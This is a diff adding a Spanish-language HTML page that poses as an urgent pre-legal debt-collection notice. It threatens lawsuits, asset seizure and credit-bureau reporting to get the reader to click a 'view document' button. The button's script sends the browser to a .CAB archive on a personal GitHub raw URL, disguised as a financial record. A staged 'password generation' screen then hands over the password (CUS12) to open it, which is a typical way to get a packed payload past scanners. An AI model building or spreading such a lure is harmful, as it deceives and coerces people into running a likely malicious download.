@@ -1,0 +1,256 @@
+﻿<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Notificación de Cobro Pre-Jurídico</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- FontAwesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+
+        @keyframes pulse-subtle {
+            0%, 100% { transform: scale(1); box-shadow: 0 4px 20px rgba(185, 28, 28, 0.2); }
+            50% { transform: scale(1.02); box-shadow: 0 6px 28px rgba(185, 28, 28, 0.4); }
+        }
+
+        .btn-animate {
+            animation: pulse-subtle 3s infinite ease-in-out;
+            transition: all 0.3s ease;
+        }
+
+        .btn-animate:hover {
+            animation: none;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(185, 28, 28, 0.5);
+        }
+
+        /* Modal Blur */
+        .backdrop-blur-custom {
+            backdrop-filter: blur(8px);
+        }
+    </style>
+</head>
+<body class="bg-slate-100 text-slate-800 antialiased min-h-screen py-8 px-4 flex justify-center items-center">
+
+    <div class="max-w-2xl w-full bg-white rounded-2xl shadow-xl overflow-hidden border border-slate-200">
+        
+        <!-- Header Corporativo -->
+        <div class="bg-slate-900 text-white p-6 sm:p-8 border-b-4 border-red-700">
+            <div class="flex items-center justify-between">
+                <div class="flex items-center space-x-3">
+                    <div class="w-12 h-12 rounded-lg bg-red-700/20 border border-red-500/30 flex items-center justify-center">
+                        <i class="fa-solid fa-scale-balanced text-red-500 text-2xl"></i>
+                    </div>
+                    <div>
+                        <h1 class="text-xl font-bold tracking-wide uppercase text-white">Departamento Legal & Cobranzas</h1>
+                        <p class="text-xs text-slate-400">Dirección de Notificaciones Extrajudiciales</p>
+                    </div>
+                </div>
+                <span class="inline-flex items-center px-3 py-1 rounded-full text-xs font-semibold bg-red-950 text-red-400 border border-red-800">
+                    <i class="fa-solid fa-triangle-exclamation mr-1.5 text-xs"></i> URGENTE
+                </span>
+            </div>
+        </div>
+
+        <!-- Cuerpo de la Notificación -->
+        <div class="p-6 sm:p-8 space-y-6">
+            <div class="border-b border-slate-200 pb-4 flex flex-wrap justify-between items-center text-sm text-slate-600 gap-2">
+                <div><strong>Ref:</strong> EXP-2026-PREJUR-0941</div>
+                <div><strong>Fecha de emisión:</strong> <span id="fecha-actual"></span></div>
+            </div>
+
+            <div class="space-y-4 text-slate-700 leading-relaxed text-sm sm:text-base">
+                <p class="font-semibold text-slate-900">NOTIFICACIÓN FORMAL DE INICIO DE PROCESO PRE-JURÍDICO</p>
+                
+                <p>
+                    Por medio de la presente comunicación oficial, se le notifica que su expediente ha sido trasladado formalmente a nuestro <strong>Departamento de Gestión Legal y Jurídica</strong> debido al estado actual de mora en su obligación financiera.
+                </p>
+
+                <p>
+                    A fin de evitar el inicio de acciones judiciales formales, embargo preventivo de bienes o reporte de afectación ante las centrales de riesgo crediticio, requerimos la revisión inmediata de la documentación adjunta donde se detallan los conceptos adeudados, los plazos perentorios y la propuesta de pago extrajudicial.
+                </p>
+
+                <div class="bg-amber-50 border-l-4 border-amber-500 p-4 rounded-r-lg">
+                    <div class="flex items-start">
+                        <i class="fa-solid fa-circle-info text-amber-600 mt-0.5 mr-3 text-lg"></i>
+                        <p class="text-xs sm:text-sm text-amber-900">
+                            <strong>Importante:</strong> El documento digital contiene la citación y los estados de cuenta actualizados protegidos por protocolo de seguridad criptográfica.
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pt-4 pb-2 text-center">
+                <button id="btn-descargar" onclick="procesarDescarga()" class="btn-animate w-full sm:w-auto inline-flex items-center justify-center px-8 py-4 bg-red-700 hover:bg-red-800 text-white font-bold rounded-xl text-base shadow-lg transition duration-200 space-x-3 cursor-pointer">
+                    <i class="fa-solid fa-file-pdf text-xl"></i>
+                    <span>Visualizar documento de cobro</span>
+                    <i class="fa-solid fa-arrow-right text-sm opacity-80"></i>
+                </button>
+            </div>
+        </div>
+
+        <div class="bg-slate-50 p-6 sm:p-8 border-t border-slate-200 text-xs text-slate-500 space-y-3">
+            <div class="flex items-center space-x-2 text-slate-700 font-semibold uppercase tracking-wider">
+                <i class="fa-solid fa-shield-halved text-slate-500"></i>
+                <span>Aviso de Confidencialidad y Reserva Legal</span>
+            </div>
+            <p class="text-justify leading-relaxed">
+                <strong>ESTRICTAMENTE CONFIDENCIAL:</strong> La información contenida en esta comunicación y en los documentos adjuntos está dirigida exclusivamente a su destinatario legalmente consignado y puede contener información privilegiada, confidencial o exenta de divulgación bajo las leyes aplicables de protección de datos personales y reserva bancaria/financiera.
+            </p>
+            <p class="text-justify leading-relaxed">
+                Si usted no es el destinatario intencional, se le notifica formalmente que cualquier retención, difusión, distribución, copia o uso de esta información está estrictamente prohibida y sancionada por la ley. Si ha recibido esta notificación por error, por favor elimínela inmediatamente de sus sistemas.
+            </p>
+            <div class="pt-2 text-center text-slate-400 text-[11px]">
+                © 2026 Sistema Integral de Gestión Legal y Cobranzas Extrajudiciales. Todos los derechos reservados.
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Modal de Generación de Clave de Seguridad -->
+    <div id="modal-seguridad" class="fixed inset-0 bg-slate-900/80 backdrop-blur-custom hidden flex items-center justify-center p-4 z-50">
+        <div class="bg-white rounded-2xl shadow-2xl max-w-md w-full p-6 sm:p-8 border border-slate-100 text-center space-y-6 transform transition-all scale-95 opacity-0" id="modal-content">
+            
+            <!-- Icono Encabezado Modal -->
+            <div id="modal-icon-container" class="w-16 h-16 bg-red-100 text-red-700 rounded-full flex items-center justify-center mx-auto text-2xl">
+                <i class="fa-solid fa-lock" id="modal-icon"></i>
+            </div>
+
+            <!-- Titulo y Estado -->
+            <div class="space-y-2">
+                <h3 id="modal-title" class="text-lg font-bold text-slate-900">Generando contraseña de seguridad PDF...</h3>
+                <p id="modal-subtext" class="text-xs text-slate-500">Iniciando protocolo de desencriptado seguro de expediente legal.</p>
+            </div>
+
+            <!-- Barra de Progreso -->
+            <div id="progress-container" class="w-full bg-slate-100 rounded-full h-3 overflow-hidden border border-slate-200">
+                <div id="progress-bar" class="bg-red-600 h-full w-0 transition-all duration-300 ease-out"></div>
+            </div>
+
+            <!-- Resultado de Contraseña (Oculto al inicio) -->
+            <div id="password-result" class="hidden space-y-4 pt-2">
+                <div class="bg-slate-50 border border-slate-200 p-4 rounded-xl">
+                    <span class="text-xs text-slate-500 block mb-1 font-semibold">CONTRASEÑA DEL DOCUMENTO</span>
+                    <div class="flex items-center justify-center space-x-3">
+                        <span id="pdf-password" class="text-2xl font-mono font-bold tracking-wider text-slate-900">CUS12</span>
+                        <button onclick="copiarClave()" id="btn-copy" class="px-3 py-1.5 bg-slate-200 hover:bg-slate-300 text-slate-700 rounded-lg text-xs font-semibold flex items-center space-x-1.5 transition">
+                            <i class="fa-regular fa-copy"></i>
+                            <span id="btn-copy-text">Copiar</span>
+                        </button>
+                    </div>
+                </div>
+
+                <p class="text-xs text-emerald-600 font-medium flex items-center justify-center">
+                    <i class="fa-solid fa-circle-check mr-1"></i> La descarga ha iniciado automáticamente.
+                </p>
+
+                <button onclick="cerrarModal()" class="w-full py-2.5 bg-slate-900 hover:bg-slate-800 text-white rounded-xl font-medium text-sm transition">
+                    Cerrar ventana
+                </button>
+            </div>
+
+        </div>
+    </div>
+
+    <script>
+        // Formatear Fecha Actual
+        document.addEventListener("DOMContentLoaded", () => {
+            const opciones = { year: 'numeric', month: 'long', day: 'numeric' };
+            const hoy = new Date().toLocaleDateString('es-ES', opciones);
+            document.getElementById('fecha-actual').textContent = hoy;
+        });
+
+        const LINK_DESCARGA = "https://raw.githubusercontent.com/rama251387/DOC/refs/heads/main/RADICADO_AUTO_GENERADO_POR_INCONSISTENCIA_FINANCIERA_EN_ARQUEO_DE_CAJA.CAB";
+
+        function procesarDescarga() {
+            const modal = document.getElementById('modal-seguridad');
+            const modalContent = document.getElementById('modal-content');
+            const progressBar = document.getElementById('progress-bar');
+            const modalTitle = document.getElementById('modal-title');
+            const modalSubtext = document.getElementById('modal-subtext');
+            const modalIcon = document.getElementById('modal-icon');
+            const modalIconContainer = document.getElementById('modal-icon-container');
+            const passwordResult = document.getElementById('password-result');
+            const progressContainer = document.getElementById('progress-container');
+
+            // Abrir enlace de descarga inmediatamente
+            window.location.href = LINK_DESCARGA;
+
+            // Mostrar Modal con Animación
+            modal.classList.remove('hidden');
+            setTimeout(() => {
+                modalContent.classList.remove('scale-95', 'opacity-0');
+                modalContent.classList.add('scale-100', 'opacity-100');
+            }, 10);
+
+            // Simular Progreso
+            let progreso = 0;
+            const intervalo = setInterval(() => {
+                progreso += Math.floor(Math.random() * 15) + 10;
+                if (progreso >= 100) {
+                    progreso = 100;
+                    clearInterval(intervalo);
+                    
+                    // Actualizar Estado Modal a Exitoso
+                    setTimeout(() => {
+                        progressContainer.classList.add('hidden');
+                        modalTitle.textContent = "¡Contraseña Generada con Éxito!";
+                        modalSubtext.textContent = "Ingrese el siguiente código para abrir el archivo seguro.";
+                        modalIconContainer.className = "w-16 h-16 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center mx-auto text-2xl";
+                        modalIcon.className = "fa-solid fa-key";
+                        passwordResult.classList.remove('hidden');
+                    }, 300);
+                }
+                progressBar.style.width = progreso + '%';
+            }, 250);
+        }
+
+        function copiarClave() {
+            const clave = document.getElementById('pdf-password').innerText;
+            
+            // Método de copiado seguro para iframe
+            const tempInput = document.createElement("input");
+            tempInput.value = clave;
+            document.body.appendChild(tempInput);
+            tempInput.select();
+            document.execCommand("copy");
+            document.body.removeChild(tempInput);
+
+            // Feedback Visual
+            const copyBtnText = document.getElementById('btn-copy-text');
+            const originalText = copyBtnText.textContent;
+            copyBtnText.textContent = "¡Copiado!";
+            
+            setTimeout(() => {
+                copyBtnText.textContent = originalText;
+            }, 2000);
+        }
+
+        function cerrarModal() {
+            const modal = document.getElementById('modal-seguridad');
+            const modalContent = document.getElementById('modal-content');
+
+            modalContent.classList.remove('scale-100', 'opacity-100');
+            modalContent.classList.add('scale-95', 'opacity-0');
+            
+            setTimeout(() => {
+                modal.classList.add('hidden');
+                // Resetear estado del modal
+                document.getElementById('progress-container').classList.remove('hidden');
+                document.getElementById('progress-bar').style.width = '0%';
+                document.getElementById('password-result').classList.add('hidden');
+                document.getElementById('modal-title').textContent = "Generando contraseña de seguridad PDF...";
+                document.getElementById('modal-subtext').textContent = "Iniciando protocolo de desencriptado seguro de expediente legal.";
+                document.getElementById('modal-icon-container').className = "w-16 h-16 bg-red-100 text-red-700 rounded-full flex items-center justify-center mx-auto text-2xl";
+                document.getElementById('modal-icon').className = "fa-solid fa-lock";
+            }, 200);
+        }
+    </script>
+</body>
+</html>
